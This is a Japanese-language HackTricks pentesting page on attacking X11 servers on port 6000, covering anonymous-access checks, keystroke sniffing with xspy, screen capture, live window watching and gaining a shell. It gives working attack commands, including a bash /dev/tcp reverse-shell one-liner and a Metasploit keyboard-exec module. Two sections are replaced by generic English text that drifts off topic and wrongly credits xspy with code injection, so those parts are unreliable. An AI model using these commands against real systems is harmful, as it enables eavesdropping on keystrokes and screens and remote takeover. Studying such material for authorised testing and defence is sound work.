# 6000 - X11のペンテスト

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

## 基本情報

X Window System（Xとも呼ばれる）は、ビットマップディスプレイ用のウィンドウシステムであり、UNIXベースのオペレーティングシステムで一般的に使用されています。XはGUIベースの環境の基本的なフレームワークを提供します。また、Xはユーザーインターフェースを強制しません - 個々のプログラムがこれを処理します。\
参照元：[https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**デフォルトポート：** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## 列挙

**匿名接続**を確認します。
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### ローカル列挙

ユーザーのホームフォルダにあるファイル **`.Xauthority`** は、**X11の認証**に使用されます。[**ここから**](https://stackoverflow.com/a/37367518)：

> MIT-magic-cookie-1: 128ビットのキー（"cookie"）を生成し、それを \~/.Xauthority（またはXAUTHORITY環境変数が指す場所）に保存します。クライアントはそれを平文でサーバーに送信します！サーバーはこの "cookie" のコピーを持っているかどうかをチェックし、もしそうであれば接続が許可されます。キーはDMXによって生成されます。

{% hint style="warning" %}
**クッキー**を使用するには、環境変数 **`export XAUTHORITY=/path/to/.Xauthority`** を設定する必要があります。
{% endhint %}

## 接続の検証
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## キーロギング

[xspy](http://tools.kali.org/sniffingspoofing/xspy)はキーボードのキーストロークを嗅覚するためのツールです。

サンプル出力：
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## スクリーンショットのキャプチャ

To capture screenshots during a penetration test, you can use various tools and techniques. Here are some methods you can try:

### 1. Scrot

Scrot is a command-line tool that allows you to capture screenshots in Linux. You can install it using the following command:

```bash
sudo apt-get install scrot
```

Once installed, you can use the `scrot` command to capture screenshots. For example, to capture the entire screen, you can run:

```bash
scrot screenshot.png
```

### 2. Shutter

Shutter is a feature-rich screenshot tool for Linux. You can install it using the following command:

```bash
sudo apt-get install shutter
```

Once installed, you can launch Shutter from the applications menu. It provides a graphical interface that allows you to capture screenshots of specific windows, regions, or the entire screen.

### 3. Flameshot

Flameshot is another powerful screenshot tool for Linux. You can install it using the following command:

```bash
sudo apt-get install flameshot
```

Once installed, you can launch Flameshot from the applications menu. It provides a user-friendly interface that allows you to capture screenshots, annotate them, and save or share them.

### 4. Snipping Tool

If you are using Windows, you can use the built-in Snipping Tool to capture screenshots. You can search for it in the Start menu and launch it. It provides various options for capturing screenshots, such as capturing a specific window, a rectangular region, or the entire screen.

### 5. Grab

If you are using macOS, you can use the built-in Grab tool to capture screenshots. You can find it in the Utilities folder, which is located in the Applications folder. It provides options for capturing the entire screen, a specific window, or a selected portion of the screen.

These are just a few examples of tools you can use to capture screenshots during a penetration test. Choose the one that best suits your needs and preferences.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## リモートデスクトップビュー

方法: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)からの情報です。
```
./xrdp.py <IP:0>
```
方法: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

最初に、xwininfoを使用してウィンドウのIDを見つける必要があります。
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

**ライブビューイング**のためには、以下のコマンドを使用する必要があります。
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## シェルを取得する

To get a shell on a target system, you can exploit vulnerabilities in the X11 server or client. Here are some techniques you can use:

### 1. X11 Forwarding

If the target system has X11 forwarding enabled, you can use SSH to forward X11 traffic and run X11 applications remotely. This can be useful for running graphical tools or accessing the X11 server.

To enable X11 forwarding, use the `-X` or `-Y` option when connecting via SSH:

```bash
ssh -X user@target
```

### 2. X11 Injection

X11 injection involves injecting malicious code into an X11 server or client to gain control over the target system. This can be done by exploiting vulnerabilities in X11 libraries or by intercepting X11 traffic.

One popular tool for X11 injection is `xspy`, which allows you to intercept and modify X11 traffic. You can use it to inject malicious code and execute commands on the target system.

### 3. X11 Reverse Shell

Another technique is to create a reverse shell using X11. This involves creating a malicious X11 client that connects back to your machine and provides a shell on the target system.

To create a reverse shell, you can use tools like `xterm` or `xcalc` with the `-e` option to execute a command. For example:

```bash
xterm -e "bash -i >& /dev/tcp/your-ip/your-port 0>&1"
```

Replace `your-ip` and `your-port` with your machine's IP address and the port you want to listen on.

These are just a few techniques you can use to get a shell on a target system using X11. Remember to always obtain proper authorization before attempting any penetration testing activities.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
他の方法：

**リバースシェル：** XrdpはNetcatを介してリバースシェルを取得することも可能です。次のコマンドを入力します：

**./xrdp.py \<IP:0> –no-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

新しいコントロールパネルが表示され、Rシェルオプションが表示されます。以下に示します：

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

ローカルシステムでポート5555でNetcatのリスニングモードを開始します。以下に示します：

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

次に、IPとポートを追加し、R-Shellを選択します。以下に示します：

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

以下のように、完全なシステムアクセスが確認できます：

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

\`\`

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
